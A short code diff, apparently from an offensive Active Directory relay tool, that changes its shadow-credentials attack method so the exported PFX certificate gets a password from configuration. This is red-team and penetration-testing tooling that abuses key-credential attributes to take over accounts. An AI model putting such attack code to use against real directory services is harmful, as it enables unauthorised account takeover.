@@ -239,7 +239,8 @@ class LDAPAttack(ProtocolAttack):
     
     def shadowCredentialAttack(self, domainDumper, ldap_session, target):
         shadowcreds = ShadowCredentials(domainDumper, ldap_session, target)
-        shadowcreds.add(export_type="PFX", domain=self.config.userDomain, password=None, path=target.replace("$",""), dc_ip=self.config.kdc)
+        pfx_pass = config.get_pass()
+        shadowcreds.add(export_type="PFX", domain=self.userDomain, password=pfx_pass, path=target.replace("$",""), dc_ip=self.kdc)
         config.set_targetName(target)
         config.set_priv(True)
 
